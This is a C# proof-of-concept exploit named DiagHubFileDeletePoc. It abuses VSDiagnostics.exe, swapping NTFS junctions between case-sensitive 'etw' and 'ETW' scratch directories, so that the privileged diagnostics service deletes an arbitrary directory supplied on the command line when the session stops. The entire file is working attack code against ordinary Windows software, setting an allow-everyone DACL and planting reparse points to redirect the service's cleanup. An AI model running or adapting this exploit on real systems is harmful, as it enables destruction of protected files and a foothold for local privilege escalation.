using NtApiDotNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DiagHubFileDeletePoc
{
    class Etw
    {
        public const string Legit = "etw";
        public const string Mali = "ETW";
        public const string Link = "Etw";
    }

    class Program
    {
        private const string DaclAllowEveryOneSD = "D:(A;;GA;;;WD)(A;OICIIO;GA;;;WD)";

        static void RunCommand(string filename, string arguments)
        {
            Console.Error.WriteLine($"Exeucuting command: {filename} {arguments}");
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(filename, arguments);
            procStartInfo.UseShellExecute = false;
            using (var p = System.Diagnostics.Process.Start(procStartInfo))
            {
                p.WaitForExit();
            }
        }

        // TODO: figure it out one day how to do the same with NtApiDotNet
        static void CreateJunction(string junctionPath, string destinationPath)
        {
            RunCommand("CMD.exe", $"/c mklink /d /j \"{junctionPath}\" \"{destinationPath}\"");
        }

        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                Console.Error.WriteLine("Usage: DiagHubFileDeletePoc path-to-a-dir-for-scratch path-to-directory-to-be-deleted");
                return;
            }

            var rootDir = args[0];
            var dirToBeDeleted = args[1];

            var baseDir = Path.Combine(rootDir, "diaghub-delete-poc");
            var baseDirNt = NtFileUtils.DosFileNameToNt(baseDir);

            Directory.CreateDirectory(baseDir);

            using (var ntFile = NtFile.Open(baseDirNt, null, FileAccessRights.MaximumAllowed, FileShareMode.All, FileOpenOptions.DirectoryFile))
            {
                SecurityDescriptor sddl = new SecurityDescriptor(DaclAllowEveryOneSD);
                ntFile.SetSecurityDescriptor(sddl, SecurityInformation.Dacl);
                try
                {
                    ntFile.CaseSensitive = true;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine($@"Unable to flag {baseDir} as case-sensitive. Make sure NtfsEnableDirCaseSensitivity DWORD at HKLM\SYSTEM\CurrentControlSet\Control\FileSystem is set to 1");
                    Console.Error.WriteLine(e.Message);
                    return;
                }

                Console.Error.WriteLine($"Case sensitive dir created successfully {baseDir}");
            }



            var LegitDir = Path.Combine(baseDir, Etw.Legit);
            Directory.CreateDirectory(LegitDir);
            var MaliDir = Path.Combine(baseDir, Etw.Mali);
            Directory.CreateDirectory(MaliDir);

            var LinkDir = Path.Combine(baseDir, Etw.Link);
            if(Directory.Exists(LinkDir))            
               Directory.Delete(LinkDir);
            CreateJunction(LinkDir, LegitDir);

            Console.WriteLine("Preparation succeeded");

            var guid = Guid.NewGuid().ToString().ToUpper();
            RunCommand("VSDiagnostics.exe", $"start {guid} /loadAgent:514a5e80-cc1b-4844-9139-0da4afdcf814;NetworkCollectionAgent.dll /scratchLocation:{LinkDir}");

            Directory.Delete(LinkDir);
            CreateJunction(LinkDir, MaliDir);

            var MaliSessionDir = Path.Combine(MaliDir, guid);
            Directory.CreateDirectory(MaliSessionDir);

            var epDir = Path.Combine(MaliSessionDir, "EP");

            CreateJunction(epDir, dirToBeDeleted);
            var epDirNt = NtFileUtils.DosFileNameToNt(epDir);

            // note we are opening the reparse point itself, not the target
            // and we dont close this handle
            var ep = NtFile.Open(epDirNt, null, FileAccessRights.MaximumAllowed, FileShareMode.Read, FileOpenOptions.OpenReparsePoint | FileOpenOptions.DirectoryFile);

            RunCommand("VSDiagnostics.exe", $"stop {guid} /output:-");

            Console.WriteLine("Done!");
        }
    }
}
